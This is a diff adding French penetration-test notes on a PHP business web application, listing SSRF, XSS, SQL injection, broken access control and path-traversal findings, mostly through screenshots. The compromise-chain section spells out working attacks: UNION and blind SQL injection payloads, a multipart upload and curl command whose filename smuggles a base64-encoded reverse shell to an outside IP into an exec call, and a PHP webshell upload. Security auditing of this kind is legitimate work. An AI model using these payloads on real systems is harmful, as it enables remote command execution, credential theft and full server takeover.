@@ -1,0 +1,353 @@
+## SSRF
+
+Fichier: ajoutConstatMeteo.php
+![[IMG-20260603160340949.png]]
+
+## CVE PHPMailer 5.2.28
+
+![[IMG-20260603160341181.png]]
+
+##  CVE dompdf c7dc571
+
+![[IMG-20260603160343679.png]]
+
+## XSS 
+
+Fichier: consulterConstatCabine.php et consulterConstatChantier.php et consulterConstatMateriel.php et consulterConstatMeteo.php
+
+![[IMG-20260603160345375.png]]
+$d[nom_fichier] peut contenir du code javascript
+
+Cet élément est ajouté en BDD par la méthode `addConstatCabine` dans le fichier `mdl_materiel.php` et est ajoutable depuis le site via la page `ajoutConstatCabine.php`
+
+## SQLi
+
+Fichier: cronMatriceFormations.php (appelé par le fichier accueilMatriceFormations.php)
+
+![[IMG-20260603160345442.png]]
+
+Fichier: genererPlanningIndisponibilites.php (appelé par le fichier accueilPlanningIndisponibilites.php)
+![[IMG-20260603160347199.png]]
+![[IMG-20260603160348283.png]]
+
+Fichier: matriceCongesEmploye.php (appelé par les fichiers listeCongesEmploye_OLD.php et calendrierConges.php)
+![[IMG-20260603160350626.png]]
+![[IMG-20260603160352581.png]]
+
+Fichier: matriceRechercheFormations.php (appelé par le fichier resultatRechercheFormationsEmploye.php)
+![[IMG-20260603160354332.png]]
+![[IMG-20260603160355176.png]]
+
+![[IMG-20260603160356078.png]]
+```
+SELECT DISTINCT s.idSalarie FROM SALARIE s, FORMATION f WHERE s.idSalarie = f.employe AND s.archive = 0
+  AND (f.employe IN (SELECT employe FROM FORMATION WHERE archive = 0 AND nom_formation = 10))
+  AND (s.fonction_fiche = 1) 
+  
+  
+  
+  
+  GET /matriceRechercheFormations.php?formations=10))+UNION+SELECT+password+FROM+USER--+ 
+  
+   UNION+SELECT+username+FROM+USER+WHERE+iduser=1+AND+(SELECT+substr(username,1,1)+FROM+USER+WHERE+iduser=1)=A
+   
+   UNION+SELECT+(SELECT+substr(username,1,1)+FROM+USER+WHERE+iduser=1)=a+--
+   
+   UNION+SELECT+CASE+WHEN+(SELECT+substr(username,1,1)+FROM+USER+WHERE+iduser=1)='t'+THEN+1+ELSE+0+END--+
+   
+  formations=10))+UNION+SELECT+CASE+WHEN+(SELECT+substr(username,1,1)+FROM+USER+WHERE+password=test)='t'+THEN+1+ELSE+0+END--+ 
+
+UNION+SELECT+(SELECT+substr(password,1,1)+FROM+`USER`+WHERE+username='test'+LIMIT+1)
+UNION SELECT substr(password,1,1) FROM `USER` WHERE username='test' LIMIT 1--+
+
+OR (SELECT substr(username,1,1) FROM USER WHERE iduser=1)='A' --
+
+OR IF((SELECT substr(username,1,1) FROM USER WHERE iduser=1)='C', 1=2, 0)
+
+10))+OR+IF((SELECT+substr(username,1,1)+FROM+USER+WHERE+iduser=1)='C',1=2,0)--+
+```
+
+
+
+## ACL
+
+Le fichier `adminer1.php` est accessible directement et embarque sa propre gestion de session (`adminer_sid`), indépendante de l’authentification de l’application métier. Ainsi, le contrôle d’accès applicatif reposant sur `$_SESSION['droit']` ne protège pas cette interface.  Un utilisateur non autorisé peut donc atteindre l’interface Adminer et tenter une authentification directe à la base de données.
+
+fichier: recup_ajax.php
+![[IMG-20260603160357767.png]]
+
+Toute les fonctions sont appelable depuis une requête côté client. ça laisse accès à des fonctions critiques tel que
+![[IMG-20260603160358783.png]]
+Ici on peut créer une requête en spécifiant fonction=connexionAdmin&&idUser=1 et on peut devenir admin de cette façon
+
+![[IMG-20260603160359698.png]]
+On peut aussi bypass la connexion en spécifiant palpatine dans la requête ce qui nous permet d'avoir la session id=1
+
+
+
+
+## RCE
+
+Fichier: consulterEvenement.php
+![[IMG-20260603160400834.png]]
+
+![[IMG-20260603160400910.png]]
+
+![[IMG-20260603160401799.png]]
+
+Regarder si on ne peut pas maitriser les valeurs dans la variable plan et programme
+
+Fichier: genererFormulaireAccueilChantier2.php
+![[IMG-20260603160402449.png]]
+![[IMG-20260603160403426.png]]
+
+fichier genererCauserie.php 
+
+Appelé par les fichiers suivants:
+![[IMG-20260603160403968.png]]
+
+![[IMG-20260603160404617.png]]
+![[IMG-20260603160405097.png]]
+
+fichier recup_ajax.php
+![[IMG-20260603160405866.png]]
+et
+![[IMG-20260603160406384.png]]
+
+Upload d un fichier sans restriction côté serveur -> RCE via file upload
+## Creds admin FTP
+
+Fichier: consulterEvenement.php
+![[IMG-20260603160406832.png]]
+
+## Utilisation de mcrypt_create_iv de nombreuses fois
+
+Fichier: consulterEvenement.php
+![[IMG-20260603160407199.png]]
+
+## Path traversal
+
+fichier: zipCatalogueTotal.php (appelé par le fichier choixFichiersZipCatalogueTotal.php)
+
+![[IMG-20260603160407236.png]]
+
+![[IMG-20260603160407849.png]]
+Ecraser d'autre ZIP sur le serveur
+
+![[IMG-20260603160408417.png]]
+Peut permettre d'écrire un fichier zip dans un autre dossier -> RCE potentiel 
+
+![[IMG-20260603160408981.png]]
+Si on maitrise la valeur de $doc, on peut récupérer d'autres dossier sur le serveur via path traversal
+
+
+## Chemin de compromission
+
+### Scénario 1
+
+Dans le fichier consulterEvenement.php il y a un exec qui est effectué:
+```php
+exec('convert "upload/'.$plan['chemin'].'.'.$plan['extension'].'" -alpha off -colorspace RGB -page a4 -quality 80 "upload/tmp/'.$tmp.'/img.jpg"', $output, $return_var);
+```
+
+Cette exec appel plusieurs variable dont `$plan['chemin']` et `$plan['extension']`
+
+![[IMG-20260603160351833.png]]
+
+Donc la variable `$plan` agit comme une fome de structure. Il s'agit du dernier document à avoir le `type = PLAN`
+Les documents sont récupérés via le méthode `Chantier::getFichiersEvenementChantier`. Voici sa définition:
+![[IMG-20260603160354256.png]]
+
+On voit aussi dans la class `Chantier` qu'il existe une méthode `addFichiersEvenementChantier`
+![[IMG-20260603160355083.png]]
+
+Cette méthode peut être appelé côté client grace à une requête POST sur la route `/recup_ajax.php` en exploitant l'ACL qui permet d'appeler toutes les fonctions backend de ce fichier:
+
+```
+POST /recup_ajax.php HTTP/1.1
+Host: exemple.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
+Cookie: PHPSESSID=xxxx
+
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="fonction"
+
+addFichiersEvenementChantier
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="evenement"
+
+test
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="commentaires"
+
+test
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="type"
+
+PLAN
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="fichiers[]"; filename="image.png[$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvOTk5OSAwPiYxJw== | base64 -d | bash)]"
+Content-Type: image/png
+
+AAAA
+------WebKitFormBoundary7MA4YWxk--
+```
+
+ou 
+
+```
+echo -n "AAAA" > file.png
+
+curl -X POST http://cible.com/recup_ajax.php \
+  -H "Cookie: PHPSESSID=xxxx" \
+  -F 'fonction=addFichiersEvenementChantier' \
+  -F 'evenement=test' \
+  -F 'commentaires=test' \
+  -F 'type=PLAN' \
+  -F 'fichiers[]=@file.png;filename="image.png[$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash)]";type=image/png'
+```
+
+
+![[IMG-20260603160409517.png]]
+
+On peut ensuite déclencher le `exec` dans le fichier consulterEvenement.php:
+![[IMG-20260603160409781.png]]
+
+### Demo
+
+Serveur test php:
+```
+<?php
+
+if (!isset($_FILES['fichiers'])) {
+    die("no file");
+}
+
+$rand = bin2hex(random_bytes(4));
+
+$tmp = "tmp_" . $rand;
+
+mkdir($tmp);
+
+for ($i = 0; $i < count($_FILES['fichiers']['name']); $i++) {
+
+    $name = $_FILES['fichiers']["name"][$i];
+    echo "RAW filename: $name\n";
+
+    $tabExt = explode('.', $name);
+    $exten = $tabExt[count($tabExt) - 1];
+
+    echo "RAW extension: $exten\n";
+
+    $chemin = "file_" . $rand;
+
+    $cmd = 'convert "upload/'.$chemin.'.'.$exten.'" -alpha off output.jpg';
+
+    echo "\n[CMD BUILT]\n$cmd\n\n";
+
+    exec($cmd, $output, $return_var);
+}
+```
+
+![[IMG-20260603160410494.png]]
+
+![[IMG-20260603160410868.png]]
+
+### Scénario 2
+
+Grace à l'ACL qui permet d'appeler toutes les fonctions du fichier `recup_ajax.ph`, on peux utiliser la méthode `addFichiersEvenementChantier` pour ajouter une payload php dans le repertoire upload
+
+```
+POST /recup_ajax.php HTTP/1.1
+Host: exemple.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
+Cookie: PHPSESSID=xxxx
+
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="fonction"
+
+addFichiersEvenementChantier
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="evenement"
+
+test
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="commentaires"
+
+test
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="type"
+
+PLAN
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="file"; filename="payload.php"
+Content-Type: application/x-php
+
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+
+------WebKitFormBoundary7MA4YWxk--
+```
+
+![[IMG-20260603160411526.png]]
+
+Cependant, on ne connait pas son chemin. Mais on peut le récupérer via une SQLi comme celle présente dans `genererPlanningIndisponibilites.php`:
+
+![[IMG-20260603160411852.png]]
+
+![[IMG-20260603160412462.png]]
+
+On peut donc passer par une SQLi pour connaitre le chemin du fichier qu'on envoi:
+
+Error Based:
+```sql
+AND (
+  SELECT SUBSTRING(
+    (SELECT chemin
+     FROM CHANTIER_EVENEMENT_DOCUMENT
+     WHERE nom_fichier='payload.php'
+     LIMIT 1),
+  1,1)
+) = 'a'
+```
+
+```sql
+AND (SELECT substr(chemin,1,1) FROM CHANTIER_EVENEMENT_DOCUMENT WHERE nom_fichier='payload.php' LIMIT 1)= 'a' --
+```
+
+Time Based:
+```sql
+1 AND IF(
+  SUBSTRING(
+    (SELECT chemin
+     FROM CHANTIER_EVENEMENT_DOCUMENT
+     WHERE nom_fichier='payload.php'
+     LIMIT 1),
+  1,1
+  ) = 'a',
+  SLEEP(5),
+  0
+) --
+```
+
+```sql
+1 AND IF((SELECT SUBSTR(chemin,1,1) FROM CHANTIER_EVENEMENT_DOCUMENT WHERE nom_fichier='payload.php' LIMIT 1)='a',SLEEP(5),0)--
+```
+
+Ensuite on accède au webshell via le nom du fichier qu'on récupère
+
+
